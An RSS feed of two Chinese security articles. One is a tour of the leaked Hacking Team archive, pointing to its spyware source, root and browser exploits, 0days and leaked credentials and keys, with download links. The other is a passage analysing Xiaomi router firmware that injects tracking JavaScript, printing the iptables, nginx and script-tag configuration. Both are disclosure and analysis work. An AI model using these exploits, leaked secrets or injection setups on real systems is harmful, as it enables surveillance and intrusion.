<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>乌云知识库</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/</link>
<description>像一朵乌云一样成长 像一朵乌云一样成长</description>
<language>zh-cn</language>
<lastBuildDate>Wed, 02 Jan 2019 00:16:25 +0800</lastBuildDate>
<item>
<title>人手一份核武器 - Hacking Team 泄露（开源）资料导览手册</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-07-08-20102713.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/20102713&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;author:蒸米&lt;/p&gt;&lt;h1&gt;0x00 序&lt;/h1&gt;&lt;p&gt;事先声明本人并不是全栈安全工程师，仅仅是移动安全小菜一枚，所以对泄漏资料的分析难免会有疏忽或着错误，望各位围观的大侠手下留情。&lt;/p&gt;&lt;p&gt;首先来看安全界两大元老对Hacking Team(以下简称HT)被黑这个事件的看法：&lt;/p&gt;&lt;p&gt;@tombkeeper: Stuxnet 让公众知道：“原来真有这种事”，Snowden 让公众知道：“原来这种事这么多”，Hacking Team 让公众知道：“原来这种事都正经当买卖干了”。&lt;/p&gt;&lt;p&gt;@赵武在路上: 2011年的时候，HBGray被黑，很多人没有意识到意味着什么，因为跟国家安全相关。这两天Hacking team被黑，大家也没有意识到意味着什么。这次包括了客户清单和0day，但我更关注的是RCS的代码，以前行业内都是粗糙到不行的demo，工程化公开的很少，这次会让行业内的技术往前推进几年，尤其是黑产。&lt;/p&gt;&lt;p&gt;可以说这次事件和斯诺登事件的影响力是不相上下的，但HT被黑不光光是让公众知道有这回事，随之而来还有整整415G的泄漏资料！里面有Flash 0day, Windows字体0day, iOS enterprise backdoor app, Android selinux exploit, WP8 trojan等等核武级的漏洞和工具。那么废话不多说，我们这就开始导览之旅。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/39a7100a8a7608c5c5a136d032ed86f5_r.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;513&quot;&gt;&lt;h1&gt;0x01 总览&lt;/h1&gt;&lt;p&gt;因为所有文件加起来的大小整整有415.77G。光下载就得好久好久。还好有人把整个镜像放了一份在网上。有兴趣的同学可以直接去查看：&lt;a href=&quot;http://ht.transparencytoolkit.org/&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot;&gt;http://ht.transparencytoolkit.org/&lt;/a&gt;。据说之所以这么大是因为里面有很多的邮件。但你不用担心你的小水管，有好人整理了一个只有1.3G的精华版。在这里我也提供一个百度网盘下载：&lt;a href=&quot;http://pan.baidu.com/s/1i3lHQRF&quot; data-editable=&quot;true&quot; data-title=&quot;HackingTeam_免费高速下载&quot;&gt;HackingTeam_免费高速下载&lt;/a&gt; 。在下载完完整版之前，我们就先拿精华版解解馋吧。&lt;/p&gt;&lt;p&gt;里面的数据大概是这样的：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/d8a92a97f21b60bcbe8e61db0ac91e6a_r.jpg&quot; data-rawwidth=&quot;378&quot; data-rawheight=&quot;716&quot;&gt;&lt;p&gt;“HACKING TEAM PASSWORDS AND TWEETS.pdf” 里主要保存了Christian Pozzi这个人经常去的网站的账号以及密码以及twitter的截图。估计他就是那个被黑了电脑的人了，因为这个人的电脑被黑，连带着HT内网git服务器，知识库，邮件服务器的数据全部都被dump下来了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/ac458b2066e7b43f395325b8b6be2af6_r.jpg&quot; data-rawwidth=&quot;317&quot; data-rawheight=&quot;323&quot;&gt;&lt;p&gt;Hacking Team Saudi Arabia Training.pdf里面数据貌似不全，通过提纲来开看主要是介绍了如何安装和使用RSC (Remote Control System)系统。不得不说HT最牛的东西就是他们的RCS系统了，他们公司实现了全平台的RSC系统（包括windows phone）。我们可以看一下他们系统的截图：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/0570b826ae82ad8150a15df4406636f7_r.jpg&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;873&quot;&gt;&lt;p&gt;各种监控信息详细到令人发指。不知道有多少人被这样监控着。&lt;/p&gt;&lt;p&gt;gitosis-admin-master.zip里保存了git服务器上成员的public key以及每个人负责的项目，通过”gitosis.conf”就可以大概知道哪个项目是谁在做了。比如placidi这个成员主要做android相关的项目。Naga, daniele, zeno, diego, ivan这几个人组要做fuzzer。Matteo, zeno, daniele这几个主要做病毒查杀检测。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/d675edde4214127fadb15ea8b7c56321_r.jpg&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;223&quot;&gt;&lt;p&gt;所以接下来的章节我们也会按照他们的分组来进行分别讲解。&lt;/p&gt;&lt;h1&gt;0x02 Android&lt;/h1&gt;&lt;p&gt;1 core-android-audiocapture-master.zip主要是利用Collin Mulliner提供的hook框架来hook mediaserver从而进行语音和通话监听。”Pack”文件夹里保存了最后编译完成的程序。而”references”文件夹里几乎都是Collin Mulliner论文的ppt，并且整个项目就是在&lt;a href=&quot;https://github.com/crmulliner/adbi&quot; data-editable=&quot;true&quot; data-title=&quot;crmulliner/adbi · GitHub&quot;&gt;crmulliner/adbi · GitHub&lt;/a&gt;这个项目上改的。截取下来的音频并不是 wav格式，还需要使用”decoder”文件夹下的工具进行解密，看样子作者除了电话监听，还成功测试了wechat, whatsapp, skype等应用的语音截获。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/db04830bc5200461a134bdb220907cbf_r.jpg&quot; data-rawwidth=&quot;145&quot; data-rawheight=&quot;154&quot;&gt;&lt;p&gt;2 core-android-market-master.zip应该是用来向Google Play上传监控应用的项目。虽然说Google Play检测系统，但对于这种用于APT攻击的malware是毫无作用的。在\core-android-market-master\doc\readme.txt中还保存HT开发者账号的用户名和密码。但是当笔者准备尝试登录的时候，发现密码已经在几个小时前被修改了。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/277ab60e98f9b42bce60f6a530d3ec65_r.jpg&quot; data-rawwidth=&quot;544&quot; data-rawheight=&quot;567&quot;&gt;&lt;p&gt;3 core-android-master.zip就是HT的RSC系统源码了。除去一些编译用的gradle文件，所有的源码都保存在” \core-android-master\RCSAndroid”目录下，通过这个RSC app除了可以做到基本信息监控外，还可以获取所有主流社交应用的信息。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/fa58edb637ccff7545b222f706003891_r.jpg&quot; data-rawwidth=&quot;225&quot; data-rawheight=&quot;226&quot;&gt;&lt;p&gt;在应用加固方面，这个RSC app除了使用了DexGuard进行混淆，还有虚拟机检测功能。根据开发日志，这个项目貌似还使用很多0day的trick对应用进行混淆。非常值得以后慢慢研究。 接下来就是重头戏root了，主要代码都在\core-android-master\RCSAndroid\jni 这个目录下， 上来就能看到” exploit_list.c”这个霸气的文件，里面可以调用各种exp来获取root权限：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/5d1e1e2c4c9ea68505178c48d2b0e626_r.jpg&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;209&quot;&gt;&lt;p&gt;除此之外，core-android-master\RCSAndroid\jni\selinux_exploit还有绕过 selinux enforcing模式的exploit。&lt;/p&gt;&lt;p&gt;4 core-android-native-master.zip中有更加详细的root项目代码和说明，在”legacy_native”文件夹中： Suidext中包含了所有的shell。Local2root中包含了&amp;lt;=4.1版本的root exp。在”selinux_native”文件夹中，”Put_user_exploit”: 包含了 put_user calls的exp。”Kernel_waiter_exploit”包含了towelroot的exp。Suidext包含了新的shell。使用” build.sh”编译完后的exp都在”bin”目录下（这些exp是可以干掉android 5.0 selinux的）。其他的文件请参考目录下的README.txt。因为是意大利语，请使用Google自行翻译一下。&lt;/p&gt;&lt;h1&gt;0x03 iOS &amp;amp; Mac OS&lt;/h1&gt;&lt;p&gt;1 “core-ios-master.zip”里面的” core”文件夹中保存了RCS的主要代码。主要是利用dylib注入对用户输入，GPS，屏幕等信息进行监控。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/deb28f0312bfed30c3f7ce4cf0966aa3_r.jpg&quot; data-rawwidth=&quot;419&quot; data-rawheight=&quot;338&quot;&gt;&lt;p&gt;”ios-newsstand-app”文件夹应该是另一个ios应用的源码。看代码大概是替换ios系统的输入法，然后进行键盘记录，大概是用来攻击没有越狱的机器吧。”Keybreak”文件夹是用来破解手机锁屏密码的，里面有lockdownd remote exploit的源码。”ios-install-win32”和” ios-install-osx”文件夹里是windows和mac os下来给iPhone或者iPad装应用的工具。此外HT还拥有一个iOS enterprise帐号可以用来发布enpublic app: “UID=DE9J4B8GTF, CN=iPhone Distribution: HT srl, OU=DE9J4B8GTF, O=HT srl, C=IT”。关于enpublic app的危害，可以参考我之前的文章或论文。&lt;/p&gt;&lt;p&gt;2 “vector-ipa-master.zip”里面应该是另一个ios木马的源码，这个木马并不是应用，貌似是一个底层网络代理，可以用来监控或者控制系统的网络流量。&lt;/p&gt;&lt;p&gt;3 “core-macos-master.zip”的”core-macos-master\core”的文件夹中保存了mac os RCS的源码，其实就是mac os木马了，和windows的木马非常相似。&lt;/p&gt;&lt;h1&gt;0x04 Windows Phone &amp;amp; symbian &amp;amp; blackberry&lt;/h1&gt;&lt;p&gt;1 core-winphone-master.zip是Windows Phone的RCS木马。据说在WP设备上实现“激活追踪”是利用了系统中的一个0day，允许第三方代码程序像受信任程序一样执行。该RCS还可以获取联系人、日历、通话、地理位置、短信、传感器状态状态等信息。程序ID为：11B69356-6C6D-475D-8655-D29B240D96C8。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/9426b726144b47626ec6e8ce7794f6ca_r.jpg&quot; data-rawwidth=&quot;599&quot; data-rawheight=&quot;367&quot;&gt;&lt;p&gt;2 core-blackberry-master.zip和core-symbian-master.zip分别是黑莓和塞班的RCS系统。&lt;/p&gt;&lt;h1&gt;0x05 Fuzzer&lt;/h1&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;fuzzer-windows-master.zip主要保存了windows下的fuzzer源码。里面有针对IE和字体的Fuzzer测试系统。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;fuzzer-windows-master.zip主要保存了android下的fuzzer源码。里面有针对jpg，sms和system call的Fuzzer测试系统。Trinity主要是用来做system call fuzzer的，比如说binder使用的ioctl()系统调用。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic4.zhimg.com/3c4340b8abe2594e9f3035ab47a98c9b_r.jpg&quot; data-rawwidth=&quot;180&quot; data-rawheight=&quot;84&quot;&gt;&lt;h1&gt;0x06病毒查杀检测&lt;/h1&gt;&lt;p&gt;test-av-master.zip是第一代产品。test-av2-master.zip是第二代产品。HT给他们起名叫AVMonitor。这个系统主要使用来做查杀检测，用来保证自己的产品可以通过检测。test-av2-master.zip\test-av2-master\doc\AVTEST Box.xlsx保存了他们使用的杀毒软件的列表和序列号。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/845c95353d3b2849d645de1089476a5e_r.jpg&quot; data-rawwidth=&quot;1211&quot; data-rawheight=&quot;349&quot;&gt;&lt;p&gt;在”test-av2-master\doc\whiteboard”文件夹中甚至有他们开会的白板照。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/9691283966b4bb49d09a8f0f7961c4a3_r.jpg&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;952&quot;&gt;&lt;h1&gt;0x07 Exploit &amp;amp; 0day&lt;/h1&gt;&lt;p&gt;vector-exploit-master.zip文件又是第二波高潮的开始，首先在里面你可以找到两个flash的exp: 一个是Flash的0day : ActionScript ByteArray Buffer Use After Free，另一个是Nicolas Joly在Pwn2Own 2015大赛中使用的CVE-2015-0349。为了在IE和Chrome上绕过其沙盒机制完全控制用户系统，Hacking Team还利用了一个Windows中的内核驱动： Adobe Font Driver(atmfd.dll)中存在的一处字体0day漏洞，实现权限提升并绕过沙盒机制。该0day漏洞可以用于WindowsXP~Windows 8.1系统，X86和X64平台都受影响。数字公司已经在很多人种子还没下完的时候就写出了分析报告：&lt;a href=&quot;http://drops.wooyun.org/papers/6968&quot; data-editable=&quot;true&quot; data-title=&quot;Hacking Team攻击代码分析&quot;&gt;Hacking Team攻击代码分析&lt;/a&gt;，有兴趣的读者可以前去围观。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/078e140d665f3126422f103f14c4415e_r.jpg&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;536&quot;&gt;&lt;p&gt;除了flash的两个exp和font 0day外，在vector-exploit-master\src\ht-webkit-Android4-src目录下还有一个Android Browser exploit，在用android brower浏览一个网页后就可以在目标机器上安装上目标apk。该漏洞会影响Android 4.0.&lt;em&gt;到4.3.&lt;/em&gt;版本的手机。粗略看了一下源码，利用过程十分复杂，exp的利用至少有四个stage，还用到了information leak，heap spray等技术。PS:在vector-exploit-master\src\ht-webkit-Android4-src\docs中有公司开会的时候拍的exp图解。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/ca0d4c1c12371e4a9e55387e3afafe08_r.jpg&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;1691&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/00626933a4a97e1b0266a72a739d49cc_r.jpg&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;952&quot;&gt;&lt;h1&gt;0x08 其他&lt;/h1&gt;&lt;ol&gt;&lt;li&gt;GeoTrust-master Signing Keys.zip 保存了HT的GeoTrust证书。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://ht.transparencytoolkit.org/audio/&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot;&gt;http://ht.transparencytoolkit.org/audio/&lt;/a&gt; 里有大量的录音。&lt;/li&gt;&lt;li&gt;HT在自己家的产品中留下了SQL后门，方便他们随时查询。&lt;a href=&quot;http://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/ALoR/htdocs/conf.php&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot;&gt;http://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/ALoR/htdocs/conf.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;虚拟机保护壳VMProtect Professional的很多正版key泄漏&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/ALoR/VMProtect.key&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot; class=&quot;&quot;&gt;https://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/ALoR/VMProtect.key&lt;/a&gt;&lt;a href=&quot;https://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/Ivan/vmprotect/&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot;&gt;https://ht.transparencytoolkit.org/rcs-dev%5cshare/HOME/Ivan/vmprotect/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h1&gt;0x09 八卦&lt;/h1&gt;&lt;p&gt;1 Phineas Fisher号称自己黑了gamma和HT。HT的twitter还转发了这条消息。。。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/4f48f389465e7f3572649ab36fe44fba_r.jpg&quot; data-rawwidth=&quot;435&quot; data-rawheight=&quot;105&quot;&gt;&lt;p&gt;2 HT的密码都特别简单，不被黑才怪。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/0e6da1a2c4c56ea0ef4058bdceb5b5f7_r.jpg&quot; data-rawwidth=&quot;261&quot; data-rawheight=&quot;126&quot;&gt;&lt;p&gt;3 &lt;a href=&quot;http://ht.transparencytoolkit.org/c.pozzi/Desktop/you.txt&quot; data-editable=&quot;true&quot; data-title=&quot;transparencytoolkit.org 的页面&quot;&gt;http://ht.transparencytoolkit.org/c.pozzi/Desktop/you.txt&lt;/a&gt; 你懂的。。。(from @youstar)&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/86f8d72260ad04f8ea2c8a96e293085c_r.jpg&quot; data-rawwidth=&quot;652&quot; data-rawheight=&quot;230&quot;&gt;&lt;h1&gt;0x10 未完待续&lt;/h1&gt;&lt;p&gt;由于泄漏的资料实在太过庞大，本文还有很多的内容没有覆盖到。因此我们在随后的几天还会继续跟进这个事件，并更新我们的文章，欢迎大家回来继续阅读。&lt;/p&gt;&lt;p&gt;============================================================&lt;/p&gt;&lt;p&gt;&lt;b&gt;乌云知识库征集技术paper，包括并不仅限于安全方面，如果你有好的技术沉淀想要分享，欢迎前来投稿&lt;a href=&quot;http://drops.wooyun.org/newsend&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;投稿 | WooYun知识库&quot;&gt;http://drops.wooyun.org/newsend&lt;/a&gt; 也可直接发送原稿到drops@wooyun.org&lt;/b&gt;&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2015-07-08-20102713</guid>
<pubDate>Wed, 08 Jul 2015 00:00:00 +0800</pubDate>
</item>
<item>
<title>小米路由器劫持用户浏览器事件回顾</title>
<link>https://henix.github.io/feeds/zhuanlan.drops/2015-06-29-20091644.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/20091644&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;author:lxj616&lt;/p&gt;&lt;h1&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;小米路由器开发版固件（并非稳定版固件，不会影响大多数用户，如果你不明白这是什么意思，它不会影响到你）使用黑客技术劫持用户浏览器向用户投送广告，该技术在黑客界广泛用于偷取用户密码甚至可能控制用户电脑和手机，目前小米已经回应该事件，称该事件为“借机炒作恶意煽动”，并解释“所谓的广告”是友好的新功能提示。目前小米官方已经做出相应调整，该功能已经暂时失效。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/aef14f1a975eae6806364a98ac432d19_r.jpg&quot; data-rawwidth=&quot;605&quot; data-rawheight=&quot;53&quot;&gt;&lt;p&gt;2015年6月初，有用户举报说最新开发版（2.3.31）的小米路由器固件劫持了用户浏览器，在用户完全不知情的情况下向浏览器发送广告代码并执行，本文以官方提供下载的2.3.5版本进行代码分析，论证其功能的技术实现以及可能影响，并对照小米官方微博的声明进行技术核对和解释。&lt;/p&gt;&lt;h1&gt;0x01 用户举报&lt;/h1&gt;&lt;p&gt;在V2EX上由用户反映在通过小米路由器浏览网页时，网页被注入了JS代码，而这段代码目前还只是被用来显示广告。 &lt;a href=&quot;https://www.v2ex.com/t/199701&quot; data-editable=&quot;true&quot; data-title=&quot;《小米路由器先劫持 http 错误码, 现在又在部分网站添加小尾巴, 什么节奏?》&quot;&gt;《小米路由器先劫持 http 错误码, 现在又在部分网站添加小尾巴, 什么节奏?》&lt;/a&gt; 这意味着你在完全不知情的前提下，你看到的所有内容其实都受小米路由器的控制，这段代码可以被用来显示广告，也可以偷取你的密码，可以随便修改任何网页的内容来欺骗你，甚至如果你的浏览器有漏洞的话，小米路由器还可能会控制你的电脑或手机。&lt;/p&gt;&lt;h1&gt;0x02 原理分析&amp;amp;代码分析&lt;/h1&gt;&lt;p&gt;在代码分析之前概述一下：简单说，他是一个路由器，你通过它来上网，你把数据先交给它，然后它才把数据通过网线送出你家，而小米路由器对你交给它的数据做了手脚，不仅看了，还修改了。 以下代码来自官方网站提供下载的2.3.5版本，使用binwalk解压固件fs，再分析得到的代码&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bigota.miwifi.com/xiaoqiang/rom/r1cm/miwifi_r1cm_firmware_7054f_2.3.5.bin&quot; data-editable=&quot;true&quot; data-title=&quot;miwifi.com 的页面&quot; class=&quot;&quot;&gt;http://bigota.miwifi.com/xiaoqiang/rom/r1cm/miwifi_r1cm_firmware_7054f_2.3.5.bin&lt;/a&gt;&lt;/p&gt;&lt;p&gt;下面为/lib/firewall/rr.loader第20行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;iptables -t nat -A &quot;$1&quot; -m set --match-set &quot;rr_tb&quot; dst -p tcp -j REDIRECT --to-ports 8380
&lt;/code&gt;&lt;p&gt;在转发用户数据包之前把所有rr_tb列表里面目的为80端口的tcp数据包重定向至8380端口，这个是dnsmasq+ipset从小米服务器上获取的域名ip&lt;/p&gt;&lt;p&gt;下面为/etc/sysapihttpd/sysapihttpd.conf第384行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;miwifi_toolbar_config miwifi_toolbar_zone 500K &quot;RR_PATH_STUB&quot;;
server {
    listen 8380;
    resolver localhost;
    location / {
        set $device_id &quot;DEV_ID_STUB&quot;;
        set $rom_version &quot;ROM_VERSION_STUB&quot;;
        set $hardware &quot;DEV_MODEL_STUB&quot;;
        set $channel &quot;CHANNEL_STUB&quot;;
        include &quot;/tmp/rr/footer&quot;;
        miwifi_toolbar miwifi_toolbar_zone;
        proxy_pass $scheme://$host$request_uri;
        proxy_ignore_client_abort off;
        proxy_connect_timeout 30s;
        proxy_read_timeout 30s;
        proxy_send_timeout 30s;
        proxy_buffering off;
        proxy_set_header Accept-Encoding &#39;&#39;;
        proxy_max_temp_file_size 0;
        proxy_set_header Host $http_host;
    }
}
&lt;/code&gt;&lt;p&gt;其实sysapihttpd就是nginx，监听8380端口，做了一个反向代理（用在本地相当于透明代理），插入了/tmp/rr/footer代码（RR_PATH_STUB），至于什么是反向代理，请参考乌云知识库之前的文章&lt;a href=&quot;http://drops.wooyun.org/tips/6570&quot; data-editable=&quot;true&quot; data-title=&quot;《钓鱼？这是反代理！》&quot;&gt;《钓鱼？这是反代理！》&lt;/a&gt;，那么，这个/tmp/rr/footer是哪里来的呢？&lt;/p&gt;&lt;p&gt;下面为/usr/bin/pull-req-rule第22行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;create_url() {
    local ts=${1:-0}
    local device_id=$(matool --method deviceID)
    local rom=$(uci -q -c /usr/share/xiaoqiang get xiaoqiang_version.version.ROM)
    local hardware=$(uci -q -c /usr/share/xiaoqiang get xiaoqiang_version.version.HARDWARE)
    local channel=$(uci -q -c /usr/share/xiaoqiang get xiaoqiang_version.version.CHANNEL)
    local url=&quot;http://api.miwifi.com/rr/config&quot;
    echo $url&#39;?&#39;ts=$ts&#39;&amp;amp;&#39;device_id=$device_id&#39;&amp;amp;&#39;rom=$rom&#39;&amp;amp;&#39;hardware=$hardware&#39;&amp;amp;&#39;channel=$channel
}

extract_footer() {
    local footer_file=&quot;$rr_prefix/footer&quot;
    local footer=$(cat $content_file | grep &#39;^footer&#39; | cut -d$&#39;\t&#39; -f 2)
    echo &quot;miwifi_toolbar_template \&quot;$footer\&quot;;&quot; &amp;gt; $footer_file
}
&lt;/code&gt;&lt;p&gt;第一个函数是配置文件的地址，第二个函数是将配置文件中的广告代码放进上文所说的文件中 之后我们根据url的生成规则去看一眼这个config文件：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://api.miwifi.com/rr/config?ts=1&amp;amp;device_id=0&amp;amp;rom=2.3.31&amp;amp;hardware=miwifi&amp;amp;channel=0&quot; data-editable=&quot;true&quot; data-title=&quot;miwifi.com 的页面&quot; class=&quot;&quot;&gt;http://api.miwifi.com/rr/config?ts=1&amp;amp;device_id=0&amp;amp;rom=2.3.31&amp;amp;hardware=miwifi&amp;amp;channel=0&lt;/a&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ts  1
footer  &amp;lt;script src=\&quot;http://api.miwifi.com/toolbar?device_id=${device_id}&amp;amp;host=${host}&amp;amp;uri=${uri}&amp;amp;rom=${rom_version}&amp;amp;hardware=${hardware}&amp;amp;channel=${channel}\&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
exclude_suffix  .css|.js|.jpeg|.png|.gif|.ico
rule_count  0   0
&lt;/code&gt;&lt;p&gt;我们可以清晰的看到，这段代码是加载了一个来自api.miwifi.com的js代码文件，换句话说，这个文件里的代码你会无条件的直接执行，无论它是偷密码的，还是发广告的。 而规则已经被小米官方清空，这也意味着不再向任何域名投放广告，但是这仅仅意味着小米服务器指示你的路由器不再JS注入，但小米可以任意时间通过修改这个api.miwifi.com上的控制文件来重新指示你的路由器做JS注入，而你到时候完全不会知道发生了什么&lt;/p&gt;&lt;p&gt;而在小米作出相应调整之前，有网友记录的config文件内容为（原地址&lt;a href=&quot;http://pastebin.com/4t7eKNsA&quot; data-editable=&quot;true&quot; data-title=&quot;pastebin.com 的页面&quot;&gt;http://pastebin.com/4t7eKNsA&lt;/a&gt;）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ts      1434688147041
footer  &amp;lt;script src=\&quot;http://api.miwifi.com/toolbar?device_id=${device_id}&amp;amp;host=${host}&amp;amp;uri=${uri}&amp;amp;rom=${rom_version}&amp;amp;hardware=${hardware}&amp;amp;c
hannel=${channel}\&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
exclude_suffix  .css|.js|.jpeg|.png|.gif|.ico
rule_count      845     845
rule    67a.cn  1       0
w_rule  /       *       l       t
rule    lizhidy.com     1       0
w_rule  /       *       l       t
rule    hacg.be 1       0
w_rule  /       *       l       t
…………………省略……………………
&lt;/code&gt;&lt;p&gt;这里的rule是指投放JS代码的域名列表，只要在这个列表里，访问时就会注入JS，形象的比喻：小米具有定向打击的能力，它能在任意时间，任意域名下给你投放任意代码，小米官方称这只是友好的新功能提示，网上炒作都是恶意抹黑，然而现在显而易见的是【小米对这段代码有绝对的控制权，友好不友好都是受小米控制的，代码内容是广告还是木马到头来完全听从小米的，而你上网时必须听从这段代码指挥】&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/6aaaf6b918ff31aa7dae54443f5ba2c0_r.jpg&quot; data-rawwidth=&quot;678&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;该代码是一个动态代码，实时从小米官方服务器上获取指令执行，用户无法干预该指令的执行，并且无法得知该指令的存在&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/eb3f8ad67280bdf0e465398553571458_r.jpg&quot; data-rawwidth=&quot;670&quot; data-rawheight=&quot;647&quot;&gt;&lt;p&gt;这就是所谓的广告代码，小米对该代码有绝对控制权，可以在任意时间投放任意代码给用户执行&lt;/p&gt;&lt;h1&gt;0x03 到底广告友好不友好&lt;/h1&gt;&lt;p&gt;再看看上文小米路由器插入的广告代码，不看不要紧，一看吓一跳：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;script src=\&quot;http://api.miwifi.com/toolbar?device_id=${device_id}&amp;amp;host=${host}&amp;amp;uri=${uri}&amp;amp;rom=${rom_version}&amp;amp;hardware=${hardware}&amp;amp;channel=${channel}\&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;p&gt;host是你访问的网站，uri是你访问网站时浏览的页面【以及你提交的GET查询数据】，该数据可能包含你的账号名称、身份标识，换句话说就是你在网页里输入的东西都有可能被发往小米官方服务器，你看到什么，小米官方就能看到什么。技术上讲，你在访问网页时被跟踪了，这段代码执行时不仅仅是显示广告，而且通俗的讲就是把你浏览器地址栏里面的内容全都发送到了小米服务器上。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/eb3f8ad67280bdf0e465398553571458_r.jpg&quot; data-rawwidth=&quot;670&quot; data-rawheight=&quot;647&quot;&gt;&lt;p&gt;从网友提供的图片可以看到，网友正在浏览的网页地址&lt;a href=&quot;http://movie.douban.com/subject/25718082&quot; data-editable=&quot;true&quot; data-title=&quot;念念 (豆瓣)&quot;&gt;念念 (豆瓣)&lt;/a&gt;被小米路由器主动上交给了小米官方服务器（因为该网页并不包含特别机密信息，且网友已经公开本图片，请允许我在此公开该网页地址，请该网友见谅，话说你咋喜欢看这种电影呢，嘻嘻嘻~）&lt;/p&gt;&lt;h1&gt;0x04 总结&lt;/h1&gt;&lt;img src=&quot;https://pic3.zhimg.com/9fb67486438aed5c2dca3a21583afff1_r.jpg&quot; data-rawwidth=&quot;440&quot; data-rawheight=&quot;795&quot;&gt;&lt;ol&gt;&lt;li&gt;小米官方称“开发版试水”情况属实，并不会影响到正常使用稳定版的用户&lt;/li&gt;&lt;li&gt;小米官方称“已经作出相应调整”情况属实，临时取消JS注入域名清单（取消注入）&lt;/li&gt;&lt;li&gt;网友所说的JS注入情况属实，并且并非静态JS，而是小米服务器上的动态JS&lt;/li&gt;&lt;li&gt;网友所说的浏览器劫持情况属实，官方所说手机APP能够关闭404页面情况属实，但是这个功能默认是开着的，需要手动关闭&lt;/li&gt;&lt;li&gt;小米官方称“炒作”情况属实，首先用户在反馈时忘记注明是开发版固件，因此使用的并不是普通用户的稳定版功能，而媒体并没有解释“开发版”的含义，盲目大力渲染“劫持、注入”的危害，给用户造成了片面印象，【小米对手动安装了开发版固件的无辜用户做了劫持和JS注入，但还没有在全国强推该计划】&lt;/li&gt;&lt;li&gt;小米官方称“友好的新功能提示”不实，该代码将用户的浏览信息上传至小米服务器（具体来说，你看的每一个网页地址，某些情况下可能包含用户名、密码）&lt;/li&gt;&lt;li&gt;404页面劫持会泄露用户浏览的网页地址情况属实，但是一般来说这不会泄露个人隐私，另外404也有开关了，因此不再讨论&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;个人观点：小米路由器开发版设计的浏览器劫持、JS代码注入功能性质恶劣，严重侵犯了用户的隐私权，甚至将来有可能借此入侵用户的计算机与手机，并且所插入的JS代码确实将用户的隐私信息（浏览器访问网站的地址及部分用户输入的内容）